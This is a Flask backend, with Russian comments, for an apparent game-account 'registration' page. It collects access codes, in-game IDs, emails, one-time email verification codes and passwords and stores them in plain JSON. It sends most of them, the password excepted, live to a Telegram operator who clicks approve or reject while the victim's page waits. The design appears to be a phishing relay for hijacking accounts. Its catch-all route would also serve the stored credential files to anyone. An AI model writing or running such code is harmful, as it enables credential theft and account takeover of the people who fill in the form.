import os
import json
import uuid
import requests
from flask import Flask, request, jsonify, send_from_directory

# Статика:
# - index.html и soon.html лежат в корне
# - картинки и прочее в public/
app = Flask(__name__, static_folder="public", static_url_path="/public")

# ==== ENV ====
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("TG_ADMIN_CHAT_ID", "")
PORT = int(os.environ.get("PORT", "8000"))
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

DATA_DIR = os.environ.get("DATA_DIR", "data")
os.makedirs(DATA_DIR, exist_ok=True)


# ==== ВСПОМОГАТЕЛЬНЫЕ ====

def tg_send_message(text, reply_markup=None):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return False
    payload = {
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        r = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
        return r.ok
    except Exception:
        return False


def save_registration(uid, payload, status="pending"):
    path = os.path.join(DATA_DIR, f"{uid}.json")
    data = {"uid": uid, "status": status, "payload": payload}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def update_registration_status(uid, status):
    path = os.path.join(DATA_DIR, f"{uid}.json")
    if not os.path.exists(path):
        return False
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    data["status"] = status
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return True


# ==== СТАТИКА (чтобы сайт не упал) ====

@app.route("/")
def index():
    # отдать index.html из корня репо
    return send_from_directory(".", "index.html")


@app.route("/soon.html")
def soon():
    # отдать soon.html из корня
    return send_from_directory(".", "soon.html")


@app.route("/<path:path>")
def static_files(path):
    # 1) если файл есть в public/ — отдаем его
    public_path = os.path.join("public", path)
    if os.path.exists(public_path):
        return send_from_directory("public", path)

    # 2) если файл лежит в корне (например, другой html) — тоже отдаем
    if os.path.exists(path):
        return send_from_directory(".", path)

    return "Not found", 404


# ==== API ДЛЯ РЕГИСТРАЦИИ ====

@app.route("/api/notify-admin", methods=["POST"])
def api_notify_admin():
    body = request.get_json(silent=True) or {}
    type_ = body.pop("type", "email_code_request")
    text = f"📩 REQUEST: {type_}\n\n"
    for k, v in body.items():
        if v:
            text += f"<b>{k.upper()}</b>: {v}\n"
    ok = tg_send_message(text)
    return jsonify({"ok": ok})


@app.route("/api/submit-registration", methods=["POST"])
def api_submit_registration():
    body = request.get_json(silent=True) or {}

    uid = "reg_" + uuid.uuid4().hex[:8]

    save_registration(uid, {
        "accessCode": body.get("accessCode", ""),
        "ingameId":   body.get("ingameId", ""),
        "email":      body.get("email", ""),
        "emailCode":  body.get("emailCode", ""),
        "password":   body.get("password", "")
    }, status="pending")

    text = (
        "📝 <b>NEW REGISTRATION</b>\n"
        f"ID: <code>{uid}</code>\n"
        f"Access code: <code>{body.get('accessCode','')}</code>\n"
        f"In-game ID: <code>{body.get('ingameId','')}</code>\n"
        f"Email: <code>{body.get('email','')}</code>\n"
        f"Email code: <code>{body.get('emailCode','')}</code>\n\n"
        "Нажмите кнопку для решения."
    )

    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"approve:{uid}"},
            {"text": "⛔ Reject",  "callback_data": f"reject:{uid}"}
        ]]
    }

    ok = tg_send_message(text, reply_markup=json.dumps(keyboard))
    return jsonify({"status": "pending" if ok else "error", "uid": uid})


@app.route("/api/tg-webhook", methods=["POST"])
def api_tg_webhook():
    update = request.get_json(silent=True) or {}
    if "callback_query" in update:
        cb = update["callback_query"]
        data = cb.get("data", "")
        callback_id = cb.get("id")
        msg = "Unknown action."
        if ":" in data:
            action, uid = data.split(":", 1)
            if action == "approve":
                ok = update_registration_status(uid, "approved")
                msg = f"✅ Registration {uid} approved." if ok else "UID not found."
            elif action == "reject":
                ok = update_registration_status(uid, "rejected")
                msg = f"⛔ Registration {uid} rejected." if ok else "UID not found."
        try:
            requests.post(
                f"{TELEGRAM_API}/answerCallbackQuery",
                json={"callback_query_id": callback_id, "text": msg},
                timeout=10
            )
        except Exception:
            pass
    return jsonify({"ok": True})


@app.route("/api/check-status/<uid>", methods=["GET"])
def api_check_status(uid):
    path = os.path.join(DATA_DIR, f"{uid}.json")
    if not os.path.exists(path):
        return jsonify({"status": "not_found"}), 404
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    return jsonify({"status": data.get("status", "pending")})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
